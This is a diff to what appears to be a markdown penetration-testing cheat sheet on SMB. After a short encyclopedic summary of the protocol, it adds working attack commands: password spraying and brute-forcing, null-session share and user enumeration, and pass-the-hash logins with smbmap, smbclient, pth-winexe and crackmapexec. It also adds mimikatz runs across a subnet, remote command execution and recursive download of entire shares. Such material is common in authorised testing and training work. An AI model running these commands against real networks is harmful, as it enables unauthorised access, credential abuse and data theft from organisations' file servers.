@@ -1,3 +1,14 @@
+## Summary
+
+In computer networking, Server Message Block (SMB), one version of which was also known as Common Internet File System (CIFS, /ˈsɪfs/), operates as an application-layer network protocol[3] mainly used for providing shared access to files, printers, and serial ports and miscellaneous communications between nodes on a network. It also provides an authenticated inter-process communication mechanism. Most usage of SMB involves computers running Microsoft Windows, where it was known as "Microsoft Windows Network" before the subsequent introduction of Active Directory. Corresponding Windows services are LAN Manager Server (for the server component) and LAN Manager Workstation (for the client component).
+
+SMB can run on top of the session (and lower) network layers in several ways:
+Directly over TCP, port 445 via the NetBIOS API, which in turn can run on several transports:[6]
+On UDP ports 137, 138 & TCP ports 137, 139 (NetBIOS over TCP/IP);
+On several legacy protocols such as NBF, IPX/SPX.
+The SMB "Inter-Process Communication" (IPC) system provides named pipes and was one of the first inter-process mechanisms commonly available to programmers that provides a means for services to inherit the authentication carried out when a client[clarification needed] first connects to an SMB server.[citation needed]
+
+
 ## Server Message Block (SMB) Versions
 
 | SMB Version     | Windows version     |
@@ -54,6 +65,9 @@ auxiliary/scanner/smb/smb_version
 ```
 auxiliary/scanner/smb/smb_login
 ```
+```
+while read USER; do echo $USER && smbmap -H 10.10.10.172 -u "$USER" -p "$USER"; done < userslist
+```
 
 ## User enumerate
 ```
@@ -97,6 +111,11 @@ smb-vuln-ms06-025
 smb-vuln-ms07-029
 smb-vuln-regsvc-dos
 smb-vuln-ms08-067
+```
+
+```
+nmap --script smb-brute.nse -p445 (TARGET IP ADDRESS)
+nmap -p 139.445 --script smb-enum-users (TARGET IP ADDRESS)
 ```
 
 https://security.stackexchange.com/questions/119827/missing-scripts-in-nmap
@@ -155,6 +174,14 @@ smbmap -u guest -p "" -d <workgroup> -H $ip
 smbmap -u <user> -p <password> -d <workgroup> -H $ip
 smbmap -u <user> -p <password> -d <workgroup> -H $ip -L  #test command execution
 smbmap -u <user> -p <password> -d <workgroup> -H $ip -r  #read drive
+
+smbmap -u '' -p '' -H 192.168.1.23 # similar to crackmapexec --shares
+smbmap -u guest -p '' -H 192.168.1.23
+smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23
+smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -r # list top level dir
+smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -R # list everything recursively
+smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -s wwwroot -R -A '.*' # download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work
+smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 192.168.1.23 -x whoami # no work
 ```
 
 Recursively list dirs, and files:
@@ -172,13 +199,35 @@ Downloads a file in quiet mode:
 smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q
 ```
 
+Using hash:
+```
+mbmap.py -u user123 -p 'aad3b435b51404eeaad3b435b51404ee:0B186E661BBDBDFFFFFFFFFFF8B9FD8B' -H (TARGET IP ADDRESS)
+```
+
 ### smbclient
+
+```
+smbclient //192.168.1.23/wwwroot
+smbclient //192.168.1.23/C$ WIN20082017 -U Administrator
+smbclient //192.168.1.23/C$ A433F6C2B0D8BB92D7288ECFFACFC7CD -U Administrator --pw-nt-hash # make sure to only use the NT portion of the hash
+```
 
 - https://www.samba.org/samba/docs/current/man-html/smbclient.1.html
 - Client that can "talk" to an SMB/CIFS server
 - Operations
   - Upload/download functionality
   - Retrieving directory information
+
+
+Null session: `smbclient -N -L (TARGET IP) -m SMB2`
+Null session mount: `smbclient "\\\\(TARGET IP)\\IPC\$\\" -N -m SMB2`
+User session mount: `smbclient "\\\\(TARGET IP)\\IPC\$\\" -N -U (USER) -m SMB2`
+Pass the hash: `smbclient --user=(TARGET USERNAME) --pw-nt-hash -m smb3 \\\\(TARGET IP ADDRESS)\\(TARGET SHARE)\\ (NTLM HASH)`
+
+```
+smb> get "filename with or without spaces.txt"`
+```
+
 ```
 smbclient -L \\WIN7\IPC$ -I 192.168.13.218
 smbclient \\192.168.13.236\some-share -o user=root,pass=root,workgroup=BOB
@@ -220,10 +269,21 @@ Recursive download: https://superuser.com/questions/856617/how-do-i-recursively-
 smbclient ‘\10.11.1.220\SYSVOL’ -U=’contoso/jane%SuperPassword^’ -c ‘prompt OFF;recurse ON;lcd ‘./’;mget *’
 ```
 
+```
+# Within smbclient, download everything recursively:
+mask ""
+recurse ON
+prompt OFF
+cd 'path\to\remote\dir'
+lcd '~/path/to/download/to/'
+mget *
+```
+
 Upload file: 
 ```
 smbclient “\\10.20.20.115\Public” –user mike –pass mikey -c “put linenum-07-05-19”
 ```
+
 
 ### rpcclient
 
@@ -252,6 +312,11 @@ rpcclient $> enumalsgroups builtin
 rpcclient $> lookupnames james
 ```
 
+rpcclient $> srvinfo # operating system version
+rpcclient $> netshareenumall # enumerate all shares and its paths
+rpcclient $> enumdomusers # enumerate usernames defined on the server
+rpcclient $> getdompwinfo # smb password policy configured on the server
+
 Change password: `setuserinfo2 administrator 23 ‘password1234’`
 Lookup SID: `lookupnames administrator`
 
@@ -276,6 +341,21 @@ enum4linux -U $ip
 ```
 
 > - Ref: https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/
+
+### pth-winexe
+
+```
+pth-winexe -U administrator%WIN20082017 //192.168.1.23 cmd # using a plaintext password
+pth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hash
+pth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # domain user
+pth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhash
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //192.168.1.23 cmd # ntlm hash + empty lm hash
+# or
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
+pth-winexe -U Administrator% //192.168.1.23 cmd
+```
+
+
 
 ### nullinux
 
@@ -303,6 +383,15 @@ Automate assessing the security of large Active Directory networks
 ```
 crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
 crackmapexec smb <target(s)> -u username -H NTHASH
+
+crackmapexec -u 'guest' -p '' --shares 192.168.1.23
+crackmapexec -u 'guest' -p '' --rid-brute 4000 192.168.1.23
+crackmapexec -u 'guest' -p '' --users 192.168.1.23
+crackmapexec smb 192.168.1.0/24 -u Administrator -p P@ssw0rd
+crackmapexec smb 192.168.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
+crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 192.168.1.0/24
+crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami 192.168.1.23
+crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami 192.168.1.23 # reliable pth code execution
 ```
 
 ### Smbexec
@@ -325,6 +414,9 @@ mkdir /mnt/$shareName
 mount -t cifs //$ip/$shareName /mnt/$shareName -o username=$username,password=$password,domain=$domain
 
 mount -t auto --source //192.168.31.147/kathy --target /tmp/smb/ -o username=root,workgroup=WORKGROUP
+```
+```
+mount -t cifs //10.10.10.134/backups /mnt/share -o user=,password=
 ```
 
 ```
